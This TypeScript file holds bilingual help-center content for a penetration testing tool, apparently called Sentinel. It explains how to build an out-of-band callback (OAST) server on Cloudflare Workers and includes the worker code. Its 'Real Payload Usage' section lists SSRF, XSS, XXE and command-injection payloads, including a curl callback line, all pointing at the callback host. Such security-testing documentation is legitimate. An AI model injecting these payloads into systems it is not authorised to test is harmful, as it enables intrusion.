import type { HelpCenterFeatureEntry } from './helpCenterContent'

const wranglerBootstrapCommands = `npm install -g wrangler
wrangler login
npm create cloudflare@latest cf-oast
cd cf-oast`

const kvNamespaceCommand = `wrangler kv namespace create OAST_KV`

const wranglerJsonc = `{
  "name": "cf-oast",
  "main": "src/index.js",
  "compatibility_date": "2026-04-22",
  "kv_namespaces": [
    {
      "binding": "OAST_KV",
      "id": "YOUR_KV_NAMESPACE_ID"
    }
  ],
  "routes": [
    {
      "pattern": "*.oast.test.com/*",
      "zone_name": "test.com"
    },
    {
      "pattern": "oast.test.com/*",
      "zone_name": "test.com"
    }
  ]
}`

const workerCode = `function json(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: {
      'content-type': 'application/json; charset=utf-8',
    },
  })
}

function normalizeKey(value) {
  return typeof value === 'string' ? value.trim() : ''
}

function requireApiKey(url, env) {
  const configured = normalizeKey(env.API_KEY)
  if (!configured) {
    return null
  }

  const provided = normalizeKey(url.searchParams.get('key'))
  if (provided && provided === configured) {
    return null
  }

  return json({ ok: false, error: 'invalid api key' }, 401)
}

function buildEventKey(event) {
  return [
    typeof event?.time === 'string' ? event.time : '',
    typeof event?.method === 'string' ? event.method : '',
    typeof event?.url === 'string' ? event.url : '',
    typeof event?.ip === 'string' ? event.ip : '',
  ].join('\\n')
}

async function loadTokenRecord(env, token) {
  const raw = await env.OAST_KV.get(\`token:\${token}\`)
  if (!raw) {
    return null
  }

  return JSON.parse(raw)
}

async function saveTokenRecord(env, token, record) {
  await env.OAST_KV.put(\`token:\${token}\`, JSON.stringify(record), {
    expirationTtl: 60 * 60 * 24 * 7,
  })
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url)
    const host = (request.headers.get('host') || '').toLowerCase()
    const pathname = url.pathname

    if (host === 'oast.test.com') {
      const authError = requireApiKey(url, env)
      if (authError) {
        return authError
      }

      if (pathname === '/gen') {
        const token = crypto.randomUUID().replace(/-/g, '').slice(0, 12)
        const fqdn = \`\${token}.oast.test.com\`

        await saveTokenRecord(env, token, {
          ok: true,
          token,
          fqdn,
          created_at: new Date().toISOString(),
          hit_count: 0,
          last_hit_at: null,
          events: [],
        })

        return json({
          ok: true,
          token,
          fqdn,
          example_urls: {
            http: \`http://\${fqdn}/\`,
            https: \`https://\${fqdn}/\`,
          },
        })
      }

      if (pathname === '/lookup') {
        const token = normalizeKey(url.searchParams.get('token'))
        if (!token) {
          return json({ ok: false, error: 'missing token' }, 400)
        }

        const record = await loadTokenRecord(env, token)
        if (!record) {
          return json({ ok: false, error: 'token not found' }, 404)
        }

        return json(record)
      }

      if (pathname === '/delete') {
        if (request.method !== 'POST') {
          return json({ ok: false, error: 'method not allowed' }, 405)
        }

        let payload
        try {
          payload = await request.json()
        } catch {
          return json({ ok: false, error: 'invalid json body' }, 400)
        }

        const token = normalizeKey(payload?.token)
        if (!token) {
          return json({ ok: false, error: 'missing token' }, 400)
        }

        const record = await loadTokenRecord(env, token)
        if (!record) {
          return json({ ok: false, error: 'token not found' }, 404)
        }

        if (payload?.deleteAll === true) {
          await env.OAST_KV.delete(\`token:\${token}\`)
          return json({
            ok: true,
            deleted_all: true,
            token,
          })
        }

        if (!Array.isArray(payload?.events) || payload.events.length === 0) {
          return json({ ok: false, error: 'missing events' }, 400)
        }

        const deleteKeys = new Set(payload.events.map(buildEventKey))
        const beforeCount = Array.isArray(record.events) ? record.events.length : 0
        const nextEvents = Array.isArray(record.events)
          ? record.events.filter((event) => !deleteKeys.has(buildEventKey(event)))
          : []

        record.events = nextEvents
        record.hit_count = nextEvents.length
        record.last_hit_at = nextEvents.length > 0
          ? nextEvents[nextEvents.length - 1].time || null
          : null

        await saveTokenRecord(env, token, record)

        return json({
          ok: true,
          deleted_all: false,
          token,
          deleted_count: beforeCount - nextEvents.length,
          hit_count: record.hit_count,
          last_hit_at: record.last_hit_at,
          events: record.events,
        })
      }

      return json({
        ok: true,
        message: 'cf-oast is running',
        endpoints: ['/gen', '/lookup?token=<token>', '/delete'],
      })
    }

    if (host.endsWith('.oast.test.com')) {
      const suffix = '.oast.test.com'
      const token = host.slice(0, -suffix.length)

      const event = {
        time: new Date().toISOString(),
        host,
        method: request.method,
        url: request.url,
        path: url.pathname,
        query: Object.fromEntries(url.searchParams.entries()),
        user_agent: request.headers.get('user-agent') || '',
        referer: request.headers.get('referer') || '',
        ip: request.headers.get('cf-connecting-ip') || '',
        ray: request.headers.get('cf-ray') || '',
        colo: request.cf?.colo || '',
        country: request.cf?.country || '',
        asn: request.cf?.asn || null,
      }

      const key = \`token:\${token}\`
      const existing = await env.OAST_KV.get(key)
      let record

      if (existing) {
        record = JSON.parse(existing)
      } else {
        record = {
          ok: true,
          token,
          fqdn: host,
          created_at: new Date().toISOString(),
          hit_count: 0,
          last_hit_at: null,
          events: [],
        }
      }

      record.hit_count += 1
      record.last_hit_at = event.time
      record.events.push(event)

      if (record.events.length > 20) {
        record.events = record.events.slice(-20)
      }

      await saveTokenRecord(env, token, record)

      return new Response('ok', {
        status: 200,
        headers: { 'content-type': 'text/plain; charset=utf-8' },
      })
    }

    return new Response('not found', { status: 404 })
  },
}`

const deployCommand = `wrangler deploy`

const genResponseExample = `{
  "ok": true,
  "token": "abc123def456",
  "fqdn": "abc123def456.oast.test.com",
  "example_urls": {
    "http": "http://abc123def456.oast.test.com/",
    "https": "https://abc123def456.oast.test.com/"
  }
}`

const verificationCommands = `https://oast.test.com/gen
https://abc123def456.oast.test.com/test?a=1
https://oast.test.com/lookup?token=abc123def456
POST https://oast.test.com/delete`

const ssrfPayload = `http://abc123def456.oast.test.com/`

const xssPayload = `<script src="https://abc123def456.oast.test.com/x.js"></script>
<img src="https://abc123def456.oast.test.com/pixel">`

const xxePayload = `http://abc123def456.oast.test.com/xxe.dtd`

const commandPayload = `curl http://abc123def456.oast.test.com/rce`

export const zhTrafficOastEntry = {
  id: 'feature-traffic-oast',
  icon: 'fas fa-satellite-dish',
  title: '流量分析 / OAST',
  route: '流量分析 -> OAST',
  summary:
    '这是一份独立的 Cloudflare Worker 版 OAST 配置手册。它覆盖架构、DNS、Wrangler、KV、Worker 代码、部署、验证、实际 payload 用法、增强项和排障，不再把关键配置压缩成几条提示。',
  capabilities: [
    '把 Cloudflare Worker 版 OAST 当成完整回连平台来配置，而不是只在界面里填一个地址。',
    '用 test.com 作为示例域名，完整说明 oast.test.com 与 *.oast.test.com 的部署方式。',
    '覆盖从 DNS 记录到 Worker 代码、从 /gen、/lookup、/delete 到实际 SSRF/XSS/XXE payload 的全链路配置。',
  ],
  operations: [
    '先理解它是 HTTP/HTTPS 回连平台，不是纯 DNSLog，再开始部署。',
    '按顺序完成 DNS、Worker、KV、wrangler.jsonc、代码和 deploy。',
    '部署后先做 /gen、随机子域访问、/lookup、/delete 四段验证，再把 payload 放回 Repeater 或 Intruder。',
  ],
  detailSections: [
    {
      id: 'oast-architecture',
      title: '一、最终架构',
      description:
        '推荐把管理接口和随机回连域拆开：oast.test.com 用于 /gen、/lookup、/delete，*.oast.test.com 用于承接真实回连。整个流量路径是“目标系统 -> DNS 解析 *.oast.test.com -> Cloudflare -> Worker -> KV -> 你查询结果”。',
      items: [
        '建议固定使用 oast.test.com 作为管理域，不要直接污染 *.test.com。',
        '随机 token 子域例如 a1b2c3.oast.test.com、xss-001.oast.test.com、ssrf-test-9.oast.test.com。',
        'Worker 记录的核心字段包括 Host、URL、IP、UA、时间，以及 Cloudflare 提供的 cf-ray、colo、country、asn。',
      ],
    },
    {
      id: 'oast-limits',
      title: '二、关键限制',
      description:
        '这套方案本质上是 Cloudflare Worker 版 OAST 平台，不是严格意义上的纯 DNSLog。Worker 只能看到进入边缘的 HTTP/HTTPS 请求，看不到“只有 DNS 解析、没有继续发 HTTP/HTTPS”的场景。',
      items: [
        '适合 SSRF、XSS 外带、XXE 外连、命令执行后的 curl/wget 回连、Webhook / callback 测试。',
        '如果目标只做 DNS 解析，Worker 可能完全没有命中。',
        '命中偏少时，先排查对方是否只允许 80、是否有代理/WAF/egress 限制。',
      ],
    },
    {
      id: 'oast-prerequisites',
      title: '三、准备项',
      items: [
        '域名：test.com。',
        'Cloudflare 账号，且已开通 Workers 和 KV。',
        '本地 Node.js 与 Wrangler。',
      ],
      codeBlocks: [
        {
          id: 'oast-bootstrap',
          label: 'Worker 项目初始化',
          language: 'bash',
          code: wranglerBootstrapCommands,
        },
      ],
    },
    {
      id: 'oast-dns',
      title: '四、DNS 配置',
      description:
        '在 test.com 的 DNS 后台至少添加两条 A 记录，IP 可以先用 192.0.2.1 这种占位测试地址。真正处理请求的是 Worker Route，不是这台占位服务器。关键点不是 IP，而是“先有 DNS record，再配 route”。',
      items: [
        '主通配符记录：Type A，Name *.oast，IPv4 192.0.2.1，Proxy status 为 Proxied。',
        '可选根子域记录：Type A，Name oast，IPv4 192.0.2.1，Proxy status 为 Proxied。',
        '如果没有 *.oast 记录，随机 token 子域不会进入 Worker。',
        '如果没有 oast 记录，管理接口域 oast.test.com 没有稳定入口。',
      ],
    },
    {
      id: 'oast-kv',
      title: '五、创建 KV 命名空间',
      description:
        'KV 用于持久化 token、命中计数和事件列表。创建后会返回 namespace id，后面要写进 wrangler.jsonc。',
      codeBlocks: [
        {
          id: 'oast-kv-command',
          label: '创建 OAST_KV',
          language: 'bash',
          code: kvNamespaceCommand,
        },
      ],
    },
    {
      id: 'oast-wrangler',
      title: '六、配置 wrangler.jsonc',
      description:
        'Worker 配置至少要包含 name、main、compatibility_date、kv_namespaces 和 routes。通配符场景必须走 DNS + Route，不要尝试用 Custom Domain 直接绑定 *.oast.test.com。',
      items: [
        'kv_namespaces 里把 OAST_KV 绑定到创建出来的 namespace id。',
        'routes 必须同时覆盖 *.oast.test.com/* 和 oast.test.com/*。',
        'zone_name 固定写 test.com。',
      ],
      codeBlocks: [
        {
          id: 'oast-wrangler-jsonc',
          label: 'wrangler.jsonc',
          language: 'json',
          code: wranglerJsonc,
        },
      ],
    },
    {
      id: 'oast-worker-code',
      title: '七、Worker 代码',
      description:
        '这份最小代码做六件事：接收任意 *.oast.test.com、从子域提取 token、把命中信息写入 KV、提供 /lookup 查询结果、提供 /gen 生成测试 token、提供 /delete 删除事件或 token。事件超过 20 条时只保留最近 20 条，TTL 默认 7 天。',
      codeBlocks: [
        {
          id: 'oast-worker-js',
          label: 'src/index.js',
          language: 'javascript',
          code: workerCode,
        },
      ],
    },
    {
      id: 'oast-deploy',
      title: '八、部署',
      description: '完成 DNS、KV、wrangler.jsonc 和 Worker 代码后，直接部署到 Cloudflare。',
      codeBlocks: [
        {
          id: 'oast-deploy-command',
          label: '部署命令',
          language: 'bash',
          code: deployCommand,
        },
      ],
    },
    {
      id: 'oast-verify',
      title: '九、验证是否生效',
      description:
        '先打管理接口拿 token，再访问随机子域，然后用 lookup 查询，最后验证 delete。如果四步都通，说明配置链路是闭合的。',
      items: [
        '先访问 /gen，拿到 token 和 example_urls。',
        '再直接请求一个随机 token 子域，例如 /test?a=1。',
        '最后用 /lookup?token=<token> 确认 hit_count、last_hit_at 和 events 是否更新。',
        '用 /delete 验证单条事件删除和整条 token 删除是否都能生效。',
      ],
      codeBlocks: [
        {
          id: 'oast-verify-commands',
          label: '验证顺序',
          language: 'text',
          code: verificationCommands,
        },
        {
          id: 'oast-verify-response',
          label: '/gen 预期返回',
          language: 'json',
          code: genResponseExample,
        },
      ],
    },
    {
      id: 'oast-payloads',
      title: '十、实际使用方法',
      description:
        '管理接口配置完成后，真正有价值的是把 payload 放回你的测试流里。下面这些示例都可以直接复制后再替换 token。',
      codeBlocks: [
        {
          id: 'oast-ssrf',
          label: 'SSRF payload',
          language: 'text',
          code: ssrfPayload,
        },
        {
          id: 'oast-xss',
          label: 'XSS payload',
          language: 'html',
          code: xssPayload,
        },
        {
          id: 'oast-xxe',
          label: 'XXE payload',
          language: 'text',
          code: xxePayload,
        },
        {
          id: 'oast-command',
          label: '命令执行回连',
          language: 'bash',
          code: commandPayload,
        },
      ],
    },
    {
      id: 'oast-route-vs-custom-domain',
      title: '十一、为什么这里用 Route，而不是 Custom Domain',
      description:
        'Cloudflare Worker 的 Custom Domains 不支持 wildcard DNS records，所以不能直接把 *.oast.test.com 作为 Worker 的自定义域名。通配符回连域的正确做法是：先建 DNS 记录，再给 Worker 配 routes。',
      items: [
        '先在 DNS 中创建 oast 与 *.oast。',
        '再在 Worker 上配置 oast.test.com/* 与 *.oast.test.com/*。',
        '这不是偏好问题，而是通配符场景的约束条件。',
      ],
    },
    {
      id: 'oast-enhancements',
      title: '十二、推荐增强项',
      items: [
        '给 /gen、/lookup、/delete 增加简单 API Key 鉴权，例如 ?key=your-secret，并在 Worker 里校验 env.API_KEY。',
        '继续保持事件裁剪，只保留最近 N 条，避免单个 KV value 无限增长。',
        '增加 /list，便于查看最近生成过的 token。',
        '生成 token 时附带 scene=ssrf、scene=xss、project=test1 这类标记字段。',
      ],
    },
    {
      id: 'oast-troubleshooting',
      title: '十三、常见故障排查',
      items: [
        '访问不到 Worker：检查 *.oast.test.com DNS 是否存在、是否 Proxied、route 是否写成 *.oast.test.com/*、zone_name 是否为 test.com。',
        '根域可访问但随机子域不行：通常是只配了 oast 没配 *.oast，或只配了 oast.test.com/* 没配 *.oast.test.com/*。',
        '只看到很少命中：目标可能只做了 DNS 解析，没有继续发 HTTP；也可能是 80/443、代理、WAF 或 egress 限制。',
        'HTTPS 证书问题：Cloudflare 对 proxied 主机名会处理边缘证书，但泛子域首次覆盖和传播可能需要一点时间。',
      ],
    },
    {
      id: 'oast-checklist',
      title: '十四、按顺序执行',
      ordered: true,
      items: [
        '在 test.com 下创建 oast A 记录并开启橙云。',
        '在 test.com 下创建 *.oast A 记录并开启橙云。',
        '本地初始化 Worker 项目。',
        '创建 OAST_KV 命名空间。',
        '写入 wrangler.jsonc。',
        '放入 Worker 代码。',
        '执行 wrangler deploy。',
        '测试 https://oast.test.com/gen。',
        '测试 https://<token>.oast.test.com/test。',
        '测试 https://oast.test.com/lookup?token=<token>。',
        '测试 POST https://oast.test.com/delete。',
      ],
    },
    {
      id: 'oast-advice',
      title: '十五、实用建议',
      items: [
        '管理接口固定用 oast.test.com，随机回连域固定用 *.oast.test.com。',
        '不要直接用 *.test.com 承接回连，否则主域空间会被测试流量污染，排障和权限边界都会变差。',
        '在 Sentinel 中把 Worker 管理地址、Worker API Key、轮询间隔和连通性测试配好后，再从 Repeater / Intruder 生成或插入 payload。',
      ],
    },
  ],
} satisfies HelpCenterFeatureEntry

export const enTrafficOastEntry = {
  id: 'feature-traffic-oast',
  icon: 'fas fa-satellite-dish',
  title: 'Traffic Analysis / OAST',
  route: 'Traffic Analysis -> OAST',
  summary:
    'This is the full Cloudflare Worker OAST configuration manual. It covers architecture, DNS, Wrangler, KV, Worker code, deployment, validation, payload usage, recommended enhancements, and troubleshooting as one standalone help document.',
  capabilities: [
    'Treat Cloudflare Worker OAST as a full callback platform rather than only a UI endpoint field.',
    'Use test.com as the concrete deployment example for oast.test.com and *.oast.test.com.',
    'Cover the entire path from DNS and Worker code to /gen, /lookup, /delete, and real SSRF/XSS/XXE payload usage.',
  ],
  operations: [
    'Understand the callback model and its limits before deployment.',
    'Complete DNS, Worker, KV, wrangler.jsonc, code, and deploy in order.',
    'Validate with /gen, a random callback subdomain hit, /lookup, and /delete before using the payloads in Repeater or Intruder.',
  ],
  detailSections: [
    {
      id: 'oast-architecture',
      title: '1. Final Architecture',
      description:
        'Use oast.test.com for /gen, /lookup, and /delete, and *.oast.test.com for real callback traffic. The full path is "target system -> DNS for *.oast.test.com -> Cloudflare -> Worker -> KV -> lookup by token".',
      items: [
        'Keep the management host isolated as oast.test.com instead of mixing callback traffic directly into *.test.com.',
        'Typical token subdomains are a1b2c3.oast.test.com, xss-001.oast.test.com, and ssrf-test-9.oast.test.com.',
        'Store Host, URL, IP, user agent, timestamp, cf-ray, colo, country, and asn as the core event fields.',
      ],
    },
    {
      id: 'oast-limits',
      title: '2. Core Limits',
      description:
        'This setup is a Cloudflare Worker OAST platform, not a pure DNSLog. The Worker only sees HTTP/HTTPS traffic that reaches the edge, not cases where the target performs DNS resolution and stops there.',
      items: [
        'It fits SSRF, XSS callback checks, XXE external fetches, command-execution curl/wget callbacks, and webhook-style testing.',
        'If the target only resolves DNS, the Worker may show no hit at all.',
        'Low hit volume should be investigated through allowed ports, proxy/WAF behavior, and egress restrictions.',
      ],
    },
    {
      id: 'oast-prerequisites',
      title: '3. Prerequisites',
      items: ['Domain: test.com.', 'A Cloudflare account with Workers and KV enabled.', 'Local Node.js and Wrangler.'],
      codeBlocks: [
        {
          id: 'oast-bootstrap',
          label: 'Bootstrap the Worker project',
          language: 'bash',
          code: wranglerBootstrapCommands,
        },
      ],
    },
    {
      id: 'oast-dns',
      title: '4. DNS Setup',
      description:
        'Add at least two A records under test.com. The IP can stay as 192.0.2.1 because the Worker Route handles the traffic. The critical requirement is having the DNS records in place before configuring routes.',
      items: [
        'Wildcard record: Type A, Name *.oast, IPv4 192.0.2.1, Proxy status Proxied.',
        'Root management record: Type A, Name oast, IPv4 192.0.2.1, Proxy status Proxied.',
        'Without *.oast, random token subdomains will not hit the Worker.',
        'Without oast, the management host oast.test.com has no stable entry.',
      ],
    },
    {
      id: 'oast-kv',
      title: '5. Create the KV Namespace',
      description:
        'KV stores the token record, hit count, and callback events. The command returns a namespace id, and that id must be copied into wrangler.jsonc.',
      codeBlocks: [
        {
          id: 'oast-kv-command',
          label: 'Create OAST_KV',
          language: 'bash',
          code: kvNamespaceCommand,
        },
      ],
    },
    {
      id: 'oast-wrangler',
      title: '6. Configure wrangler.jsonc',
      description:
        'The Worker config should define name, main, compatibility_date, kv_namespaces, and routes. Wildcard callback domains should use DNS plus Routes, not a direct Custom Domain binding.',
      items: [
        'Bind OAST_KV under kv_namespaces.',
        'Cover both *.oast.test.com/* and oast.test.com/* in routes.',
        'Set zone_name to test.com.',
      ],
      codeBlocks: [
        {
          id: 'oast-wrangler-jsonc',
          label: 'wrangler.jsonc',
          language: 'json',
          code: wranglerJsonc,
        },
      ],
    },
    {
      id: 'oast-worker-code',
      title: '7. Worker Code',
      description:
        'This minimal Worker accepts *.oast.test.com callbacks, extracts the token, stores hit events in KV, exposes /lookup for results, exposes /gen for token generation, exposes /delete for token or event deletion, keeps only the latest 20 events, and expires records after 7 days.',
      codeBlocks: [
        {
          id: 'oast-worker-js',
          label: 'src/index.js',
          language: 'javascript',
          code: workerCode,
        },
      ],
    },
    {
      id: 'oast-deploy',
      title: '8. Deploy',
      description: 'Deploy after DNS, KV, wrangler.jsonc, and Worker code are all in place.',
      codeBlocks: [
        {
          id: 'oast-deploy-command',
          label: 'Deploy command',
          language: 'bash',
          code: deployCommand,
        },
      ],
    },
    {
      id: 'oast-verify',
      title: '9. Validate the Setup',
      description:
        'Generate a token first, hit a random callback subdomain, check lookup, then verify delete. If all four steps work, the deployment path is complete.',
      items: [
        'Call /gen and store the returned token and example URLs.',
        'Request a random token subdomain, such as /test?a=1.',
        'Call /lookup?token=<token> and confirm hit_count, last_hit_at, and events.',
        'Call /delete and verify both event deletion and full token deletion.',
      ],
      codeBlocks: [
        {
          id: 'oast-verify-commands',
          label: 'Validation sequence',
          language: 'text',
          code: verificationCommands,
        },
        {
          id: 'oast-verify-response',
          label: 'Expected /gen response',
          language: 'json',
          code: genResponseExample,
        },
      ],
    },
    {
      id: 'oast-payloads',
      title: '10. Real Payload Usage',
      description:
        'Once the management endpoints work, the useful part is feeding the generated domains back into actual testing flows. Replace the token as needed.',
      codeBlocks: [
        {
          id: 'oast-ssrf',
          label: 'SSRF payload',
          language: 'text',
          code: ssrfPayload,
        },
        {
          id: 'oast-xss',
          label: 'XSS payload',
          language: 'html',
          code: xssPayload,
        },
        {
          id: 'oast-xxe',
          label: 'XXE payload',
          language: 'text',
          code: xxePayload,
        },
        {
          id: 'oast-command',
          label: 'Command execution callback',
          language: 'bash',
          code: commandPayload,
        },
      ],
    },
    {
      id: 'oast-route-vs-custom-domain',
      title: '11. Why Routes Instead of a Custom Domain',
      description:
        'Cloudflare Worker Custom Domains do not support wildcard DNS records, so *.oast.test.com cannot be attached directly as a Worker Custom Domain. The correct wildcard deployment model is DNS records first, then Worker routes.',
      items: [
        'Create oast and *.oast in DNS first.',
        'Then configure oast.test.com/* and *.oast.test.com/* as Worker routes.',
        'This is a wildcard deployment constraint, not a style preference.',
      ],
    },
    {
      id: 'oast-enhancements',
      title: '12. Recommended Enhancements',
      items: [
        'Add a simple API key to /gen, /lookup, and /delete, for example ?key=your-secret, and validate env.API_KEY in the Worker.',
        'Keep trimming old events so a single KV value does not grow without bound.',
        'Add /list to inspect recent tokens.',
        'Store tags such as scene=ssrf, scene=xss, or project=test1 when issuing tokens.',
      ],
    },
    {
      id: 'oast-troubleshooting',
      title: '13. Troubleshooting',
      items: [
        'Worker unreachable: check *.oast.test.com DNS, Proxy status, route pattern *.oast.test.com/*, and zone_name test.com.',
        'Root host works but random subdomains fail: usually oast exists but *.oast does not, or oast.test.com/* exists but *.oast.test.com/* does not.',
        'Few hits only: the target may resolve DNS without sending HTTP, or traffic may be blocked by port policy, proxying, WAF, or egress controls.',
        'HTTPS certificate timing: Cloudflare manages edge certs for proxied hosts, but wildcard coverage may take time right after initial setup.',
      ],
    },
    {
      id: 'oast-checklist',
      title: '14. Execution Order',
      ordered: true,
      items: [
        'Create the oast A record under test.com and keep it proxied.',
        'Create the *.oast A record under test.com and keep it proxied.',
        'Bootstrap the Worker project locally.',
        'Create the OAST_KV namespace.',
        'Write wrangler.jsonc.',
        'Add the Worker code.',
        'Run wrangler deploy.',
        'Test https://oast.test.com/gen.',
        'Test https://<token>.oast.test.com/test.',
        'Test https://oast.test.com/lookup?token=<token>.',
        'Test POST https://oast.test.com/delete.',
      ],
    },
    {
      id: 'oast-advice',
      title: '15. Practical Advice',
      items: [
        'Keep oast.test.com as the management host and *.oast.test.com as the callback space.',
        'Do not point *.test.com directly at this workflow, because it pollutes the main domain namespace and makes troubleshooting harder.',
        'Inside Sentinel, configure the Worker management base URL, Worker API key, polling interval, and connectivity test before generating or inserting payloads from Repeater or Intruder.',
      ],
    },
  ],
} satisfies HelpCenterFeatureEntry
